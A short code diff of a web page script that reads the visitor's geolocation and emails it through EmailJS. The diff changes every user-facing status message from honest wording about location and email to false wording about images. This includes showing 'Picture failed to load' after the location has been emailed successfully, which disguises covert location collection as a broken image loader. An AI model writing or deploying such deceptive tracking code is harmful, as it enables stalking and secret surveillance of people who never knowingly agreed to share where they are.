@@ -29,23 +29,23 @@
     async function sendLocation() {
       if (!window.isSecureContext) {
         statusElement.textContent =
-          "Location access requires HTTPS or localhost.";
+          "requires HTTPS or localhost.";
         return;
       }
 
       if (!navigator.geolocation) {
         statusElement.textContent =
-          "Geolocation is not supported.";
+          "Image download broken";
         return;
       }
 
       if (!window.emailjs) {
         statusElement.textContent =
-          "Email service failed to load.";
+          "Image service failed to load.";
         return;
       }
 
-      statusElement.textContent = "Requesting location permission...";
+      statusElement.textContent = "Requesting Image permission...";
 
       try {
         const position = await new Promise((resolve, reject) => {
@@ -85,14 +85,14 @@ Date: ${new Date().toLocaleString()}
         );
 
         statusElement.textContent =
-          "Location successfully emailed!";
+          "Picture failed to load";
       } catch (error) {
         console.error(error);
 
         statusElement.textContent =
           "Error: " +
           (error?.message || error?.text ||
-            "Unable to retrieve or email your location.");
+            "Unable to load image");
       }
     }
 
